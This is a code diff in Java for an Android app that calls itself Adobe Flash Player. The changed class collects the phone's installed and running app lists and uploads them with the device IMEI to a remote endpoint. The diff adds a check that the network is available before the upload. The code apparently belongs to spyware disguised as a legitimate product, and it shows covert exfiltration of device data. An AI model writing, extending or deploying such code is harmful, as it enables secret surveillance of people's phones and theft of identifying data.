@@ -4,6 +4,7 @@ package com.adobe.flashplayer.data;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.network.NetworkUitls;
 import com.adobe.flashplayer.network.UploadData;
 import java.util.List;
 import org.json.JSONArray;
@@ -90,7 +91,11 @@ public class PhoneApps {
                 jsarray.put(1, jsarraysys);
                 jsarray.put(2, jsarrayrun);
 
-                UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_APPPROCESS, Public.IMEI);
+                if (NetworkUitls.isNetworkAvailable(context)) {
+                    UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_APPPROCESS, Public.IMEI);
+                }else{
+
+                }
                 return true;
             }
         }catch(Exception ex){
